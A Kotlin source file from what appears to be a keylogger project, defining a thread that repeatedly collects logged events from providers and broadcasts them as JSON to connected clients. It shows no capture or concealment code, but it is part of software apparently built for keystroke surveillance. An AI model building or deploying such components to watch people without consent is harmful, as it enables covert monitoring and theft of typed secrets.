package aler.key_logger.server

import aler.key_logger.events.LoggerEvent
import java.util.*

class ServerPusher(val delay : Long, val server : LoggerServer) : Thread() {
    init {
        name = "Server Pusher"
        isDaemon = false
        priority = 10
    }

    override fun run() {
        val sb = LinkedList<String>()
        while (true) {
            println("Pusher is pushing!")

            synchronized(server.providers) {
                for (provider in server.providers) {
                    val events = provider.pullEvents()
                    for (event in events) {
                        sb.add(event.getData().toJson())
                    }
                }
            }

            server.SendToAll("""
{
    "response": "events",
    "status": "ok",
    "data": [
        ${sb.joinToString()}
    ]
}
"""
            )

            sb.clear()
            sleep(delay)
        }
    }
}